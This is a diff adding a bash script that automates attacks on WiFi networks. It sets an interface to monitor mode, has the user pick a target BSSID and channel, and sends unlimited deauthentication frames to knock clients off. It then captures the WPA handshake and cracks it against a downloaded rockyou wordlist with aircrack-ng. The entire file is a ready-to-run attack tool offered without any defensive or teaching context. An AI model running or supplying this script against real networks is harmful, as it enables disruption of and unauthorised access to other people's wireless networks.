@@ -1,0 +1,76 @@
+#!/bin/bash
+
+# Made by SAJIB
+# root check
+if [ "$(id -u)" -ne 0 ]; then
+  echo "Please run as root"
+  exit 
+fi
+# dependecy check
+if [ ! -x "$(command -v aircrack-ng)" ]; then
+  echo "aircrack-ng not installed"
+  exit
+fi
+# wordlist check
+wordlist_dir="/usr/share/wordlists"
+wordlist="$wordlist_dir/rockyou.txt.tar.gz"
+if [ ! -f "$wordlist" ]; then
+  echo "wordlist does not exist"
+# download wordlist
+echo "downloading rockyou wordlist..."
+mkdir -p $wordlist_dir
+curl -L -o "$wordlist" https://raw.githubusercontent.com/zacheller/rockyou/master/rockyou.txt.tar.gz
+fi
+# extraction
+if [ ! -f "$wordlist_dir/rockyou.txt" ]; then
+echo "extracting wordlist..."
+tar -xvzf $wordlist -C $wordlist_dir
+fi
+# removing unneeded pass 
+if [ ! -f "$wordlist_dir/wordlist.txt" ]; then
+  echo "choosing passwords bettween 8-63 letters..."
+  grep -x '.\{8,63\}' "$wordlist_dir/rockyou.txt" > "$wordlist_dir/wordlist.txt"
+fi
+# enable monitor mood
+ifconfig | cut -d ' ' -f1 | cut -s -d ':' -f1
+echo Select Interface:
+read interface
+#interface=$(ifconfig | grep wl | cut -d ":" -f1)
+airmon-ng start $interface
+airmon-ng check kill
+echo Enter Monitor Mode Interface:
+#read mon
+mon=$(ifconfig | grep "$interface" | cut -d ":" -f1)
+# selecting target
+airodump-ng $mon
+echo Enter BSSID Of Target
+read bid
+echo $bid
+echo Enter Channel Of Target
+read chnl
+# capture handshake
+#xterm -hold -e sudo "airodump-ng --bssid $bid --channel $chnl --write $filn $mon"
+client=FF:FF:FF:FF:FF:FF
+airodump-ng --ig -w cap -c $chnl --bssid $bid $mon & sleep 6 &&
+xterm -hold -e "aireplay-ng --ig --deauth 0 -a $bid  $mon"
+sleep 4
+clear
+# start cracking
+echo "1. Use Default Wordlist(rockyou.txt)."
+echo "2. Specify a Custom One."
+read option
+if [ $option == "1" ]; then
+   wordlist="$wordlist_dir/wordlist.txt"
+else
+   echo Enter Path Of Your Custom Wordlist.
+   read wordlist
+fi
+aircrack-ng -w $wordlist ./cap-01.cap
+# clean up
+echo Disabling Monitor Mode........
+airmon-ng stop $mon
+echo Deleting Handshake Files.......
+mkdir -p tmp
+mv cap* tmp
+echo done!
+# exit
